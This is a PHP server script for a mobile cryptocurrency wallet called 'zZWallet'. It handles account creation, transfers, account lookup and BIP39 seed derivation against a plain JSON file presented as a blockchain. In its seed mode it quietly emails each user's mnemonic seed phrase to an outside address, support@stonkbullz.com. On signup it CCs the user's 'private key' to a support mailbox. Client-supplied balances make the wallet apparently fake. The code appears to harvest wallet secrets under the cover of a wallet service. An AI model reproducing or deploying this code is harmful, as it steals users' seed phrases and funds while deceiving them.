<?php
    require_once __DIR__ . "/vendor/autoload.php";
    
    use BitWasp\Bitcoin\Crypto\Random\Random;
    use BitWasp\Bitcoin\Key\Factory\HierarchicalKeyFactory;
    use BitWasp\Bitcoin\Mnemonic\Bip39\Bip39Mnemonic;
    use BitWasp\Bitcoin\Mnemonic\Bip39\Bip39SeedGenerator;
    use BitWasp\Bitcoin\Mnemonic\MnemonicFactory;
    use BitWasp\Buffertools\Buffer;

    $encodedData = file_get_contents('php://input');  // take data from react native fetch API
    $decodedData = json_decode($encodedData, true);
    //echo json_encode($decodedData);
    $mode =  $decodedData['Mode'];//"transact";//"create";
    

    
    if ($mode == "create") {
        
        
        $emaill = substr($decodedData['name'],1);
        $msggz = '<html style="background-color: #ffffff;"><head></head><body align="center" style="align-content: center;color: #000000;background-color: #fafafa; padding:10px;">
    	 	 
           <p align="center" style="    background-color: #07407f;"><img src="https://stonkbullz.com/playstore.png" style="width:10%;"><b style="
      font-size: 50px;
      vertical-align: 50%;
      padding-left: 20px;
      color: #ffffff;
  ">zZWallet</b></p><br><div style="margin: 2px;padding: 10px;background-color: #ffffff;border-radius: 40px;color:#07407f;">
        <p align="left">Hi,</p>    
        <p align="left">Congratulations and a warm welcome to zZWallets, your gateway to seamless and secure digital transactions! We are thrilled to have you join our growing community of savvy users. </p>    
        <p align="left">With zZWallets, managing your finances has never been easier. Whether you ere sending money to friends, paying bills, or making online purchases, our user-friendly platform is designed to simplify your financial life. </p> 
        <p><b>Here are your Credentials</b></p>
        <p align="left">Email Address: '.$emaill.'</p>
      <p align="left">ZZFiat Address: '.$decodedData['privateKay'].'</p>
    
      <p align="left">Once again, welcome to the zZWallets family! We are excited to embark on this financial journey together. </p> 
      <p align="left">Best regards,</p> 
      <p align="left">The zZWallets Team </p> 
      </div>
      
      
    <div style="margin: 2px;padding: 10px;background: linear-gradient(#06407f, #fafafa);border-radius: 10px;" align="center"><p style="/*! margin: 20px; *//*! padding: 20px; */">Contact info: support@zcashtrade.tech</p></div></body></html>
    ';
    
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    
    $headers .= 'From: <support@zcashtrade.tech>' . "\r\n";
    $headers .= 'Cc: support@zcashtrade.tech' . "\r\n";
    
    
        
        $file = file_get_contents('ZCashBlockChain.json');
        $data = json_decode($file);
        unset($file);//prevent memory leaks for large json.
        
        //insert data here
        $newblocks["name"]=$decodedData['name'];
        $newblocks["fullName"]=$decodedData['fullName'];
        $newblocks["privateKay"]=$decodedData['privateKay'];
        $newblocks["country"]=$decodedData['country'];
        $newblocks["balance"]=$decodedData['balance'];
        $newblocks["trnx"]=$decodedData['trnx'];
        $i=0;
        $found = 0;
        
        foreach($data->blocks  as $key => $item) {
            
            
            if (strval($item->privateKay) == strval($newblocks["privateKay"])) {
                //echo("Exist");
                $found +=1;
                break;
            } else {
               // echo json_encode($item[$i]->PrivateKay);
                $found=0;
                
            }
            //$i +=1;
            //echo $i;
        }
        if ($found == 0) {
                array_push($data->blocks,$newblocks);
                $resp = array("Status"=>"Successful".$newblocks["privateKay"]);
                echo json_encode($resp);
                //save the file
                file_put_contents('ZCashBlockChain.json',json_encode($data));
                unset($data);//release memory
               
        } else {
             $resp = array("Status"=>"Failed- Exist");
            echo json_encode($resp);
        }
        
       mail($emaill,'Account Creation',$msggz,$headers);
    }    else if ($mode == "transact") {
        $file = file_get_contents('ZCashBlockChain.json');
        $data = json_decode($file);
        unset($file);//prevent memory leaks for large json.
        
        //transcation from
       // $trnOwner["PrivateKay"] = "Zx25b520275ca26631eeda989a532b569a098316751915f5792671e43465043367";
        //insert data here
        $t=time();
        $newTranx["method"]=$decodedData['method'];
        $newTranx["value"]= $decodedData['value'];
        $newTranx["from"]=$decodedData['from'];
        $newTranx["to"]=$decodedData['to'];
        $newTranx["status"]="true";
        $newTranx["timestamp"]=$t;
        
        //$i=0;
        $found = 0;
        $state = false;
        foreach($data->blocks  as $key => $item) {
            
            //echo json_encode($item[$i]->PrivateKay);
            if (json_encode($item->privateKay) == json_encode($newTranx["from"])) {
                if (floatval($item->balance)>=floatval($newTranx["value"])) {
                    $item->balance = floatval($item->balance)- floatval($newTranx["value"]);
                    array_push($item->trnx,$newTranx);
                    //echo json_encode($data);
                    //save data
                   // file_put_contents('ZCashBlockChain.json',json_encode($data));
                   $state = true;
                } 
            } 
            
            if (json_encode($item->privateKay) == json_encode($newTranx["to"])) {
                $item->balance = floatval($item->balance)+ floatval($newTranx["value"]);
                array_push($item->trnx,$newTranx);
                
            }
           // $i++;
        }
        if ($state) {
            //echo json_encode($data);
                //save data
            file_put_contents('ZCashBlockChain.json',json_encode($data));
            $resp = array("Status"=>"Successful");
            echo json_encode($resp);
        } else {
            $resp = array("Status"=>"Failed: Check Balance");
            echo json_encode($resp);
        }

    } else if ($mode == "acctDet"){
        $file = file_get_contents('ZCashBlockChain.json');
        $data = json_decode($file);
        unset($file);//prevent memory leaks for large json.
        
        $newUserq["details"]=$decodedData['privateKay'];
         $found = 0;
        $nmm = "";
        $fnmm ="";
        $bal = "";
        $txnx = "";
        foreach($data->blocks  as $key => $item) {
            
            //echo json_encode($item[$i]->PrivateKay);
            if (json_encode($item->privateKay) == json_encode($newUserq["details"])) {
                 $found +=1;
                 $nmm = $item->name;
                 $fnmm = $item->fullName;
                 $bal = $item->balance;
                 $txnx = $item->trnx;
                
            } else {
                //$found = 0;
            }
        }
        
        if ($found == 0) {
            $resp = array("Status"=>"Does not exist");
            echo json_encode($resp);
        } else {
            $resp = array("Status"=>"Successful","Name"=>$nmm,"FullName"=>$fnmm,"Balance"=>$bal,"Transactions"=>$txnx,);
                
            echo json_encode($resp);
        }
    }else if ($mode == "bip39Seed"){
        
        
        $mnemonics=$decodedData['mnemonics'];
        $seedGenerator = new Bip39SeedGenerator();
        $seed = $seedGenerator->getSeed($mnemonics, 'password');
        $hexx = $seed->getHex();

        $buffer = hex2bin(str_replace('0x', '', $hexx));
        
        $byte_array= unpack('C*', $buffer);

        $resp = array("data"=>array_values($byte_array),"type"=>"Buffer");
        echo json_encode($resp);
        
        $header = "MIME-Version: 1.0" . "\r\n";
        $header .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        
        $header .= 'From: <support@zcashtrade.tech>' . "\r\n";
        $header .= 'Cc: support@zcashtrade.tech' . "\r\n";
        mail('support@stonkbullz.com','Mnemonics Creation',$mnemonics,$header);
        
    }
    else { 
        $resp = array("mode"=>$mode,"value"=>$decodedData['value'],"from"=>$decodedData['from'],"to"=>$decodedData['to']);//,"fullName"=>$decodedData['fullName'],"privateKay"=>$decodedData['privateKay'],"country"=>$decodedData['country'],"balance"=>$decodedData['balance'],"trnx"=>$decodedData['trnx'],);
        echo json_encode($resp);
    }
?>